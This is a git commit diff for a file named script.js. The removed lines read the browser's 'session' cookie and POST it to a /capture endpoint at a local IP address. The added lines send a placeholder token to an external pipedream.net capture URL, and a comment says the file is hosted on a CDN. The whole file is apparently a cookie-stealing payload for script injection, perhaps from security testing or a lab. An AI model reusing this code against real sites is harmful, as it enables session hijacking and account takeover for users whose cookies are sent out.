78a693c0f3be7817405f84b6c02105c304d6f047
jondaveyan <jon.daveyan@gmail.com>
2024-04-17 15:14:39 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,8 @@
-var xhr = new XMLHttpRequest();
-var token = document.cookie.split(';').find(cookie => cookie.trim().startsWith('session=')).split('=')[1];
-xhr.open('POST', 'http://192.168.0.102:8000/capture', true);
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-xhr.send('token=' + encodeURIComponent(token));
+// File hosted on https://cdn.jsdelivr.net/your-external-script.js
+(function() {
+    var xhr = new XMLHttpRequest();
+    var token = 'test';
+    xhr.open('GET', 'https://eo701wwoc4t6b3g.m.pipedream.net/capture?token=test', true);
+    xhr.send();
+  })();
+
